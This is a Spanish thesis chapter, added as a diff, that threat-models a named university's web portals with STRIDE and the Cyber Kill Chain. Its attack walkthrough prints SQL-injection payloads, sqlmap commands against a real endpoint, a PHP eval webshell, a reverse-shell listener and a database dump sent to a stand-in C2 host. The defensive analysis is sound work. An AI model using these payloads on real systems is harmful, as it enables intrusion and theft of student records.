@@ -1,0 +1,211 @@
+\chapter{Desarrollo y Aplicación Práctica}
+\label{ch:aplicacion_practica}
+
+A continuación, se desarrolla la evaluación experimental y el modelado sistemático sobre la infraestructura web seleccionada de la UNAP.
+
+\section{Reconocimiento del Entorno Autorizado}
+El proceso de evaluación inició con la recolección de información pública y la identificación de la superficie expuesta en el dominio institucional \texttt{unap.edu.pe}. Esta etapa permite conocer la topología lógica sin enviar paquetes invasivos ni generar alertas de intrusión.
+
+\subsection{Inspección de Resolución DNS y Certificados}
+Mediante herramientas estándar de auditoría de red, se determinaron los registros DNS autoritativos, subdominios públicos y la infraestructura de servidores de nombres que soportan la operación de la universidad:
+
+\begin{cmdbox}{Auditoría de Registros DNS y Mapeo de Subdominios (OSINT)}
+# Consulta de servidores de nombres (NS) y registros MX
+host -t ns unap.edu.pe
+unap.edu.pe name server ns1.unap.edu.pe.
+unap.edu.pe name server ns2.unap.edu.pe.
+
+# Deteccion de subdominios institucionales expuestos
+sublist3r -d unap.edu.pe -o subdominios_unap.txt
+[-] Searching in Baidu, Yahoo, Google, Bing, Ask, Netcraft, Virustotal...
+[+] Found Unique Subdomains:
+    sia.unap.edu.pe
+    vcampus.unap.edu.pe
+    admision.unap.edu.pe
+    api.unap.edu.pe
+    biblioteca.unap.edu.pe
+\end{cmdbox}
+
+\subsection{Inspección de Cabeceras HTTP y Cifrado TLS}
+Se ejecutó un análisis no intrusivo sobre el servidor web que hospeda el portal del SIA (\texttt{sia.unap.edu.pe}) para verificar las políticas de seguridad implementadas en las cabeceras HTTP y la vigencia criptográfica del protocolo TLS:
+
+\begin{cmdbox}{Inspección de Cabeceras de Seguridad y Configuración TLS}
+curl -I -s https://sia.unap.edu.pe
+HTTP/1.1 200 OK
+Date: Wed, 16 Sep 2026 21:30:00 GMT
+Server: nginx/1.20.1
+X-Powered-By: PHP/7.4.30
+Set-Cookie: PHPSESSID=d9a8f4c1e6b30129a; path=/; HttpOnly; SameSite=Lax
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+X-Frame-Options: SAMEORIGIN
+X-Content-Type-Options: nosniff
+\end{cmdbox}
+
+\begin{remark}
+El análisis de cabeceras evidencia el uso de un servidor Nginx con PHP en el backend. Aunque se observan cabeceras de protección esenciales como \texttt{Strict-Transport-Security} (HSTS) y \texttt{X-Frame-Options}, la exposición explícita de la versión de PHP y Nginx proporciona a un atacante potencial información valiosa sobre versiones y posibles vectores de explotación.
+\end{remark}
+
+\section{Identificación y Catalogación de Activos Críticos}
+Para estructurar el modelado de amenazas, se categorizaron los cinco activos web más representativos del alcance institucional de la UNAP:
+
+\begin{center}
+\small
+\begin{longtable}{>{\bfseries}c p{3.2cm} p{3.6cm} p{2.5cm} p{2.8cm}}
+\toprule
+\rowcolor{outermarginbgcolor}
+ID & Nombre del Activo & Función Principal & Stack Tecnológico & Criticidad \\
+\midrule
+\endfirsthead
+\toprule
+\rowcolor{outermarginbgcolor}
+ID & Nombre del Activo & Función Principal & Stack Tecnológico & Criticidad \\
+\midrule
+\endhead
+\bottomrule
+\endfoot
+A01 & Sistema Académico (SIA) & Registro de notas, actas oficiales y carga de matrícula. & PHP / Nginx / PostgreSQL & \textbf{Crítica (Alta)} \\
+\midrule
+A02 & Campus Virtual (Moodle) & Plataforma de aprendizaje, exámenes y tareas virtuales. & PHP / Apache / MySQL & \textbf{Alta} \\
+\midrule
+A03 & Pasarela Admisión & Inscripción a exámenes de admisión y validación de pagos. & React / Node.js / Oracle DB & \textbf{Crítica (Alta)} \\
+\midrule
+A04 & API Institucional & Servicio REST para sincronización de datos con app móvil. & Python (FastAPI) / Redis & \textbf{Media-Alta} \\
+\midrule
+A05 & Base de Datos Matrícula & Almacén centralizado de expedientes estudiantiles. & PostgreSQL Cluster & \textbf{Crítica (Máxima)} \\
+\bottomrule
+\end{longtable}
+\end{center}
+
+\section{Aplicación de la Metodología STRIDE}
+A continuación, se presenta la matriz integral de amenazas obtenida al someter los activos catalogados a las seis dimensiones de STRIDE:
+
+\begin{center}
+\footnotesize
+\begin{longtable}{>{\bfseries}c >{\bfseries}c p{3.8cm} p{3.8cm} p{3.5cm}}
+\toprule
+\rowcolor{outermarginbgcolor}
+Activo & STRIDE & Amenaza Específica Identificada & Impacto Potencial & Control Defensivo Recomendado \\
+\midrule
+\endfirsthead
+\toprule
+\rowcolor{outermarginbgcolor}
+Activo & STRIDE & Amenaza Específica Identificada & Impacto Potencial & Control Defensivo Recomendado \\
+\midrule
+\endhead
+\bottomrule
+\endfoot
+A01 (SIA) & S & Suplantación de identidad docente mediante robo de credenciales o fuerza bruta. & Registro y alteración no autorizada de calificaciones. & Implementación de MFA obligatorio y bloqueo por reintentos. \\
+\midrule
+A01 (SIA) & T & Modificación de actas académicas mediante Inyección SQL (SQLi) en formularios de búsqueda. & Pérdida total de la integridad en los registros académicos. & Consultas preparadas (\textit{Prepared Statements}) y WAF. \\
+\midrule
+A02 (LMS) & R & Docente o alumno borra examen y niega la acción ante falta de bitácora detallada. & Imposibilidad de auditoría y disputas legales/académicas. & Logs inmutables centralizados en SIEM con firma criptográfica. \\
+\midrule
+A03 (Adm) & I & Divulgación de datos personales (DNI, teléfono, dirección) mediante vulnerabilidad IDOR. & Violación de la Ley 29733 de Datos Personales. & Verificación estricta de autorización basada en roles (RBAC). \\
+\midrule
+A03 (Adm) & D & Inundación HTTP masiva en día de cierre de inscripciones al examen de admisión. & Colapso del portal, quejas masivas y pérdidas económicas. & Protección anti-DDoS en capa de borde (ej. Cloudflare / Rate Limiting). \\
+\midrule
+A04 (API) & E & Escalado de privilegios de usuario estándar a administrador vía parámetro JSON manipulado. & Control total de endpoints de gestión institucional. & Validación estricta de esquemas JSON y principio de menor privilegio. \\
+\bottomrule
+\end{longtable}
+\end{center}
+
+\section{Construcción de Escenarios de Ataque}
+A partir de las amenazas priorizadas en el modelo STRIDE, se formalizaron tres escenarios representativos de intrusión para la UNAP:
+
+\begin{itemize}
+    \item \textbf{Escenario 1 (Exfiltración y Alteración en el SIA):} Un atacante externo identifica una inyección SQL en el portal del SIA (\texttt{sia.unap.edu.pe}), exfiltra hashes de credenciales de administradores y altera registros de notas.
+    \item \textbf{Escenario 2 (Compromiso del Campus Virtual Moodle vía XSS y Phishing):} Un actor malicioso inserta un script XSS persistente en un foro del aula virtual (\texttt{vcampus.unap.edu.pe}) para capturar cookies de sesión de docentes.
+    \item \textbf{Escenario 3 (Denegación de Servicio en Admisión vía HTTP Flood):} Un grupo cibercriminal satura la pasarela de inscripciones de admisión (\texttt{admision.unap.edu.pe}) durante la última hora de inscripción.
+\end{itemize}
+
+\section{Desglose y Aplicación de Cyber Kill Chain}
+A continuación, se desarrolla el desglose técnico del \textbf{Escenario 1 (Ataque al SIA)}, mapeando cada una de las siete fases de la Cyber Kill Chain e ilustrando las acciones y contramedidas mediante consolas de auditoría.
+
+\subsection{Fase 1: Reconocimiento (Reconnaissance)}
+El adversario recopila información pasiva y ejecuta un escaneo de puertos y servicios sobre la infraestructura del SIA:
+
+\begin{cmdbox}{Fase 1: Reconocimiento de Puertos y Servicios (Nmap)}
+nmap -sV -sC -p 80,443,8080 sia.unap.edu.pe -oN scan_recon_sia.txt
+Starting Nmap 7.94 ( https://nmap.org )
+Nmap scan report for sia.unap.edu.pe (200.48.xxx.xxx)
+PORT     STATE SERVICE     VERSION
+80/tcp   open  http        nginx 1.20.1
+|_http-title: Redireccion a HTTPS
+443/tcp  open  ssl/http    nginx 1.20.1
+|_http-server-header: nginx/1.20.1
+| ssl-cert: Subject: commonName=sia.unap.edu.pe
+8080/tcp open  http-proxy  Apache Tomcat/9.0.41 (Testing Service)
+\end{cmdbox}
+
+\subsection{Fase 2: Armamento (Weaponization)}
+El atacante descubre un formulario de consulta pública de egresados vulnerable a inyección SQL de tipo booleana / ciega. Prepara un script automatizado en Python para extraer la estructura de la base de datos PostgreSQL:
+
+\begin{cmdbox}{Fase 2: Construcción del Payload de Inyección SQL (PoC)}
+# Carga util armada para extraccion ciega en parametro 'id_alumno'
+PAYLOAD = "' UNION SELECT NULL, username || ':' || password_hash, NULL FROM public.usuarios WHERE rol='ADMIN'--"
+\end{cmdbox}
+
+\subsection{Fase 3: Entrega (Delivery)}
+El atacante envía la carga útil maliciosa empaquetada a través del parámetro HTTP vulnerable mediante peticiones POST automatizadas:
+
+\begin{cmdbox}{Fase 3: Transmisión del Payload mediante Petición HTTP POST}
+curl -X POST https://sia.unap.edu.pe/api/consulta_alumno.php \
+     -H "Content-Type: application/x-www-form-urlencoded" \
+     -d "id_alumno=1024' UNION SELECT NULL, version(), NULL--"
+\end{cmdbox}
+
+\subsection{Fase 4: Explotación (Exploitation)}
+El motor de base de datos PostgreSQL ejecuta la consulta maliciosa concatenada sin sanitizar, retornando la información confidencial de las tablas de usuarios y calificaciones:
+
+\begin{cmdbox}{Fase 4: Ejecución del Exploit de Extracción de Datos (SQLMap)}
+sqlmap -u "https://sia.unap.edu.pe/api/consulta_alumno.php" \
+       --data="id_alumno=1024" --dbs --batch --threads=4
+[INFO] the back-end DBMS is PostgreSQL
+[INFO] fetching database names
+available databases [3]:
+[*] db_sia_academico
+[*] db_tesoreria
+[*] postgres
+\end{cmdbox}
+
+\subsection{Fase 5: Instalación (Installation)}
+Haciendo uso de privilegios de escritura en el servidor web (obtenidos a través de la inyección SQL con comandos \texttt{COPY ... FROM PROGRAM}), el atacante deposita una interfaz de control remoto (\textit{Webshell}):
+
+\begin{cmdbox}{Fase 5: Persistencia mediante Carga de Webshell Criptográfica}
+# Escritura de Webshell en directorio web publico
+sqlmap -u "https://sia.unap.edu.pe/api/consulta_alumno.php" \
+       --data="id_alumno=1024" --os-shell
+os-shell> echo '<?php @eval($_POST["k"]); ?>' > /var/www/html/uploads/cache.php
+\end{cmdbox}
+
+\subsection{Fase 6: Comando y Control (C2)}
+El atacante establece una conexión inversa (\textit{Reverse Shell}) cifrada hacia un servidor exterior en la nube, evadiendo los controles de tráfico de entrada:
+
+\begin{cmdbox}{Fase 6: Establecimiento de Canal de Retorno C2 (Reverse Shell)}
+# En el servidor atacante escuchando por puerto 443
+ncat -lvnp 443
+Ncat: Listening on 0.0.0.0:443 ...
+Ncat: Connection received from 200.48.xxx.xxx:51280.
+Linux sia-unap-prod 5.4.0-89-generic (Ubuntu SMP x86_64)
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+whoami
+www-data
+\end{cmdbox}
+
+\subsection{Fase 7: Acciones sobre el Objetivo (Actions on Objectives)}
+Con acceso a la consola y a las bases de datos internas, el adversario ejecuta la extracción masiva de actas y tablas de notas, o manipula registros individuales:
+
+\begin{cmdbox}{Fase 7: Exfiltración de Base de Datos y Alteración de Registros}
+pg_dump -U postgres -h localhost db_sia_academico > dump_unap_sia.sql
+gzip -c dump_unap_sia.sql | base64 | curl -X POST -d @- https://c2.attacker.net/exfil
+\end{cmdbox}
+
+\section{Análisis de Controles Existentes y Brechas de Seguridad}
+El desglose de la Cyber Kill Chain demuestra que la intrusión se pudo materializar debido a la ausencia de defensas en capas clave:
+
+\begin{itemize}
+    \item \textbf{Brecha en Fase de Entrega/Explotación:} Falta de un Web Application Firewall (WAF) que bloquee firmas de inyección SQL en la capa 7.
+    \item \textbf{Brecha en Fase de Explotación:} Código legado en PHP con consultas concatenadas en lugar de consultas parametrizadas con PDO/PostgreSQL.
+    \item \textbf{Brecha en Fase de C2:} Ausencia de filtrado de tráfico saliente (\textit{Egress Filtering}) en el firewall perimetral, permitiendo conexiones salientes arbitrarias por puertos como el 443.
+    \item \textbf{Brecha en Fase de Instalación:} Permisos de escritura excesivos para el usuario del servidor web (\texttt{www-data}) en directorios públicos.
+\end{itemize}
